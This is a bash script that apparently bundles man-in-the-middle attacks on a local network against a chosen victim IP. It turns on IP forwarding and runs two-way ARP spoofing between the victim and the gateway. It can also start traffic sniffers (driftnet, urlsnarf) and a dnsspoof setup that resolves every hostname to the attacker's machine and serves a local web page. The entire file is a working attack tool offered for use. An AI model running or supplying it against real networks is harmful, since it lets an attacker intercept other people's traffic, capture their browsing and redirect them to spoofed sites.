#!/usr/bin/env bash

#===============================================================================================
# System required: Linux
# Packages required: arpspoof
# Optional packages: driftnet, dnsspoof, urlsnarf
# Description: Bundles several man-in-the-middle scripts.
# Author: dsfranzi
#===============================================================================================

RCFILE="/tmp/arpspoofex.rc"
NGINXCONF="/tmp/nginx-fake.conf"

while getopts "hndusv:r:i:" opt 
do
	case $opt in
		h)	# Help
			echo "Usage:"
			echo "$0 [options] <-v Victim IP Address>"
			echo ""
			echo "Required Options"
			echo -e "-v <IP Address>\t\tDestination IP Address"
			echo ""
			echo "Options"
			echo -e "-h\t\t\tHelp"
			echo -e "-i <Interface>\t\tInterface"
			echo -e "-n\t\t\tNo Forwarding"
			echo -e "-r <IP Address>\t\tRouter IP Address."
			echo -e "\t\t\tStandard: the default gateway IP address if not set."
			echo ""
			echo -e "-d\t\t\tStart Driftnet"
			echo -e "-u\t\t\tStart urlsnarf"
			echo -e "-s <Hosts file>\t\tStart dnsspoof with hostsfile"
			exit 1
		;;
		i)	# Interface
			INTERFACE=$OPTARG
		;;
		n)	# No Forwarding
			NOFORWARD=true
		;;
		v)	# Destination
			VICTIM=$OPTARG
		;;
		r)	# Router
			GATEWAY=$OPTARG
		;;
		### Optional Scripts
		d)	# Driftnet
			DRIFTNET=true
		;;
		u)	# Urlsnarf
			URLSNARF=true
		;;
		s)	# Dnsspoof
			DNSSPOOF=true
		;;
	esac
done

# Requirements
if [ -z "$VICTIM" ]
then
	echo "-v Argument not provided."
	exit 1
elif [ -z "$INTERFACE" ]
then
	echo "-i Argument not provided."
	exit 1
fi

# Router IP Address
if [ -z "$GATEWAY" ] 
then
	GATEWAY=`ip route show | grep default | awk '{print $3}'`
	if [ -z "$GATEWAY" ] 
	then
	 	echo "Router IP Address not found."
		exit 1
	fi
fi

echo "Starting arpspoof..."

if [ "$NOFORWARD" == "true" ]
then
	FORWARD=0
else
	FORWARD=1
fi
echo $FORWARD > /proc/sys/net/ipv4/ip_forward

echo "startup_message off" > $RCFILE
echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
echo -e "screen -t arpspoof1 arpspoof -i $INTERFACE -t $GATEWAY $VICTIM" >> $RCFILE
echo -e "screen -t arpspoof2 arpspoof -i $INTERFACE -t $VICTIM $GATEWAY" >> $RCFILE

if [ "$DRIFTNET" == "true" ]
then
	driftnet -i $INTERFACE &
fi

if [ "$URLSNARF" == "true" ]
then
	echo -e "screen -t urlsnarf urlsnarf -i $INTERFACE" >> $RCFILE
fi

if [ "$DNSSPOOF" == "true" ]
then
	# Set up DNS spoofing
	IP=`ifconfig $INTERFACE | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
	echo "$IP *" > /tmp/spoofhosts.txt
	echo -e "screen -t dnsspoof dnsspoof -i $INTERFACE -f /tmp/spoofhosts.txt host $VICTIM and udp port 53" >> $RCFILE
	
	# Set up nginx webpage
	# echo -e "screen -t nginx nginx -c $PWD/nginx-test.conf" >> $RCFILE	
        echo -e "screen -t node nodejs server.js" >> $RCFILE	
fi

echo -e "screen -r -t Main" >> $RCFILE

screen -c $RCFILE
